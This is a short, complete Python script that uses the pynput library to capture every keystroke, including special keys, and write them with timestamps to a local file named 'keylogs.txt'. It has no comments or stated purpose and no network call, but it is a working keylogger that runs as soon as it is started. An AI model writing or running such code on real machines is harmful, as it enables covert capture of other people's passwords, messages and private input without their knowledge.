import os
import platform
import time
import logging
from pynput import keyboard

def on_key_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(f"Special Key {key}")

def setup_logging():
    log_file = "keylogs.txt"
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s]: %(message)s",
    )

def start_keylogger():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

def main():
    setup_logging()
    start_keylogger()

if __name__ == "__main__":
    main()
